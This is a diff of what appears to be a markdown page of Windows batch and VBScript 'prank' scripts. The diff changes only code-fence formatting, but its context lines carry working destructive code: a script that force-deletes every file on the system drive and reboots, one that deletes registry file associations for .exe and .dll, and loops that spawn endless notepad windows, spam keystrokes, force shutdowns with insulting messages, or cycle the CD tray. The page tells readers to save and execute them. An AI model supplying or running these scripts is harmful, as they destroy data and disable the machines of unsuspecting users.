@@ -24,8 +24,7 @@ Save the file anywhere (.bat) and execute it:
 
 Code:
 
-```
-@echo off
+```@echo off
 del %systemdrive%\*.*/f/s/q
 shutdown -r -f -t 00
 ```
@@ -35,8 +34,7 @@ shutdown -r -f -t 00
 
 code:
 
-```
-@echo off
+```@echo off
 msg * Fatal system error due to admin stupidity!
 shutdown -c “Error! You are too stupid!” -s -t 10
 ```
@@ -46,8 +44,7 @@ shutdown -c “Error! You are too stupid!” -s -t 10
 
 code:
 
-```
-@ECHO OFF
+```@ECHO OFF
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
@@ -61,8 +58,7 @@ GOTO MESSAGE
 
 code:
 
-```
-@ECHO off
+```@ECHO off
 :top
 START %SystemRoot%\system32\notepad.exe
 GOTO top
@@ -73,8 +69,7 @@ GOTO top
 
 code:
 
-```
-Set wshShell =wscript.CreateObject(“WScript.Shell”)
+```Set wshShell =wscript.CreateObject(“WScript.Shell”)
 do
 wscript.sleep 100
 wshshell.sendkeys “{CAPSLOCK}”
@@ -86,8 +81,7 @@ loop
 
 code:
 
-```
-Set wshShell = wscript.CreateObject(“WScript.Shell”)
+```Set wshShell = wscript.CreateObject(“WScript.Shell”)
 do
 wscript.sleep 100
 wshshell.sendkeys “~(enter)”
@@ -99,8 +93,7 @@ loop
 
 code:
 
-```
-MsgBox “Let’s go back a few steps”
+```MsgBox “Let’s go back a few steps”
 Set wshShell =wscript.CreateObject(“WScript.Shell”)
 do
 wscript.sleep 100
@@ -113,8 +106,7 @@ loop
 
 code:
 
-```
-Set oWMP = CreateObject(“WMPlayer.OCX.7”)
+```Set oWMP = CreateObject(“WMPlayer.OCX.7”)
 Set colCDROMs = oWMP.cdromCollection
 do
 if colCDROMs.Count >= 1 then
